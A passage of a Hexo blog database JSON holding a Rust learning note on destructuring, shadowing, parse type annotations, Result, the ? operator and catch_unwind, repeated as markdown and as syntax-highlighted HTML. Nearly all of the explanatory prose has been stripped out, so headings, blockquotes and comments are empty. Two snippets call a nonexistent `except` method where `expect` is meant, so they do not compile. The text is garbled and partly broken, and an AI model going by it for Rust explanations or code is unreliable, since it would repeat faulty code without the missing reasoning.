\\n\", f);\n    // on the moment, manually remove the file hello.txt\n    let ten_millis = time::Duration::from_millis(10000);\n    thread::sleep(ten_millis);\n    print!(\"{:?} \\n\", f);\n    let r = f.write_all(b\"Hello, world!\")?;\n    print!(\"Result is {:?} \\n\", r);\n    drop(f);\n    Ok(())\n}\n~~~\n\n`?`\n\n~~~rust\nlet f = OpenOptions::new().write(true).open(\"hello.txt\");\nlet mut f = match f{\n    Ok(file) => file,\n    Err(e) => return Err(e),\n};\n~~~\n\n\n\nrust\n\n\n\n> `panic::catch_unwind`\n>\n> \n>\n> ```rust\n> use std::panic;\n> \n> let result = panic::catch_unwind(|| {\n>     println!(\"hello!\");\n> });\n> assert!(result.is_ok());\n> \n> let result = panic::catch_unwind(|| {\n>     panic!(\"oh no!\");\n> });\n> assert!(result.is_err());\n> ```\n>\n> try/catchpanicErrRusttry/catchRustthrow**Result**\n>\n> catch_unwindunwindpanicpanic\n>\n> [Rust Documentation](https://link.zhihu.com/?target=https%3A//doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html)","source":"_posts/rust-note-#1.md","raw":"---\ntitle: Rust\ndate: 2022-05-19\nauthor: \nhide: false\nsummary: &&&&\ncategories: \ntags:\n  - Rust\n  - Rust\n---\n\n# Rust\n\n## \n\n>  `var a = \"hello world\"`  `a`  `\"hello world\"`  `a`  Rust  `let a = \"hello world\"` ****\n>\n>  Rust ****\n>\n>  Rust Course\n\n## \n\n~~~rust\nstruct Struct {\n    e: i32\n}\n\nfn main() {\n    let (a, b);\n\n    a = 1;\n    b = 2;\n    // \n    let [c,..,d,_] = [1, 2, 3, 4, 5];\n    // \n    let Struct { e, .. } = Struct { e: 5 };\n\n    assert_eq!([1, 2, 1, 4, 5], [a, b, c, d, e]);\n}\n~~~\n\n## (shadowing)\n\nRust \n\n```rust\nfn main() {\n    let x = 5;\n    // mainx\n    let x = x + 1;\n\n    {\n        // x\n        let x = x * 2;\n        println!(\"The value of x in the inner scope is: {}\", x);\n    }\n\n    println!(\"The value of x is: {}\", x);\n}\n```\n\n## \n\nkt\n\n~~~rust\nlet guess = \"42\".parse().except(\"Not a number\"); // parse\nlet guess: i32 = \"42\".parse().except(\"Not a number\"); // \nlet guess = \"42\".parse::<i32>().expect(\"Not a number!\"); // \n~~~\n\nrust::\n\n## \n\n> ## Rust \n>\n> Rust \n>\n> Rust \n>\n> - ****\n> - ****\n>\n> Rust  Rust `Result<T, E>` `panic!` \n>\n>  Rust Crouse\n\n`panic!``Result`Rusttry catch\n\nrustgojavakotlinResult API~\n\n~~~rust\n// expect  panic!\nlet guess = \"42\".parse::<i32>().expect(\"Not a number!\");\n\n// go\n// \nlet guess = \"42\".parse::<i32>();\nmatch guess {\n    Ok(num) => println!(\"You guessed: {}\", num),\n    Err(err) => println!(\"Error: {}\", err),\n}\n~~~\n\nrust`?`Result\n\n~~~rust\nuse core::time;\nuse std::{fs::OpenOptions, thread, io::Write};\n\nfn main() -> std::io::Result<()> {\n    let mut f = OpenOptions::new().write(true).open(\"hello.txt\")?; // <-\n    print!(\"{:?} \\n\", f);\n    // on the moment, manually remove the file hello.txt\n    let ten_millis = time::Duration::from_millis(10000);\n    thread::sleep(ten_millis);\n    print!(\"{:?} \\n\", f);\n    let r = f.write_all(b\"Hello, world!\")?;\n    print!(\"Result is {:?} \\n\", r);\n    drop(f);\n    Ok(())\n}\n~~~\n\n`?`\n\n~~~rust\nlet f = OpenOptions::new().write(true).open(\"hello.txt\");\nlet mut f = match f{\n    Ok(file) => file,\n    Err(e) => return Err(e),\n};\n~~~\n\n\n\nrust\n\n\n\n> `panic::catch_unwind`\n>\n> \n>\n> ```rust\n> use std::panic;\n> \n> let result = panic::catch_unwind(|| {\n>     println!(\"hello!\");\n> });\n> assert!(result.is_ok());\n> \n> let result = panic::catch_unwind(|| {\n>     panic!(\"oh no!\");\n> });\n> assert!(result.is_err());\n> ```\n>\n> try/catchpanicErrRusttry/catchRustthrow**Result**\n>\n> catch_unwindunwindpanicpanic\n>\n> [Rust Documentation](https://link.zhihu.com/?target=https%3A//doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html)","slug":"rust-note-#1","published":1,"updated":"2022-12-12T15:53:02.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtt002asfklccn5f8w7","content":"<h1 id=\"Rust\"><a href=\"#Rust\" class=\"headerlink\" title=\"Rust\"></a>Rust</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<p> <code>var a = \"hello world\"</code>  <code>a</code>  <code>\"hello world\"</code>  <code>a</code>  Rust  <code>let a = \"hello world\"</code> <strong></strong></p>\n<p> Rust <strong></strong></p>\n<p> Rust Course</p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Struct</span> <span class=\"token punctuation\">{</span>\n    e<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    b <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">,</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>_<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">let</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">{</span> e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">..</span> <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">{</span> e<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">assert_eq!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"-shadowing\"><a href=\"#-shadowing\" class=\"headerlink\" title=\"(shadowing)\"></a>(shadowing)</h2><p>Rust </p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// mainx</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// x</span>\n        <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of x in the inner scope is: {}\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of x is: {}\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>kt</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">except</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// parse</span>\n<span class=\"token keyword\">let</span> guess<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">except</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// </span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>rust::</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<h2 id=\"Rust-\"><a href=\"#Rust-\" class=\"headerlink\" title=\"Rust \"></a>Rust </h2><p>Rust </p>\n<p>Rust </p>\n<ul>\n<li><strong></strong></li>\n<li><strong></strong></li>\n</ul>\n<p>Rust  Rust <code>Result&lt;T, E&gt;</code> <code>panic!</code> </p>\n<p> Rust Crouse</p>\n</blockquote>\n<p><code>panic!</code><code>Result</code>Rusttry catch</p>\n<p>rustgojavakotlinResult API~</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// expect  panic!</span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// go</span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">match</span> guess <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You guessed: {}\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error: {}\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>rust<code>?</code>Result</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">core<span class=\"token punctuation\">::</span></span>time<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token punctuation\">{</span><span class=\"token namespace\">fs<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">,</span> thread<span class=\"token punctuation\">,</span> <span class=\"token namespace\">io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Write</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// &lt;-</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{:?} \\n\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// on the moment, manually remove the file hello.txt</span>\n    <span class=\"token keyword\">let</span> ten_millis <span class=\"token operator\">=</span> <span class=\"token namespace\">time<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Duration</span><span class=\"token punctuation\">::</span><span class=\"token function\">from_millis</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token namespace\">thread<span class=\"token punctuation\">::</span></span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span>ten_millis<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{:?} \\n\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> r <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">write_all</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"Hello, world!\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Result is {:?} \\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">drop</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>?</code></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> f <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> f<span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> file<span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">return</span> <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<p>rust</p>\n<p></p>\n<blockquote>\n<p><code>panic::catch_unwind</code></p>\n<p></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span>panic<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token namespace\">panic<span class=\"token punctuation\">::</span></span><span class=\"token function\">catch_unwind</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">is_ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token namespace\">panic<span class=\"token punctuation\">::</span></span><span class=\"token function\">catch_unwind</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">panic!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"oh no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">is_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>try/catchpanicErrRusttry/catchRustthrow<strong>Result</strong></p>\n<p>catch_unwindunwindpanicpanic</p>\n<p><a href=\"https://link.zhihu.com/?target=https://doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html\">Rust Documentation</a></p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Rust\"><a href=\"#Rust\" class=\"headerlink\" title=\"Rust\"></a>Rust</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<p> <code>var a = &quot;hello world&quot;</code>  <code>a</code>  <code>&quot;hello world&quot;</code>  <code>a</code>  Rust  <code>let a = &quot;hello world&quot;</code> <strong></strong></p>\n<p> Rust <strong></strong></p>\n<p> Rust Course</p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Struct</span> <span class=\"token punctuation\">&#123;</span>\n    e<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    b <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">,</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>_<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">let</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">&#123;</span> e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">..</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">&#123;</span> e<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">assert_eq!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"-shadowing\"><a href=\"#-shadowing\" class=\"headerlink\" title=\"(shadowing)\"></a>(shadowing)</h2><p>Rust </p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// mainx</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// x</span>\n        <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of x in the inner scope is: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of x is: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>kt</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">except</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// parse</span>\n<span class=\"token keyword\">let</span> guess<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">except</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// </span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>rust::</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<h2 id=\"Rust-\"><a href=\"#Rust-\" class=\"headerlink\" title=\"Rust \"></a>Rust </h2><p>Rust 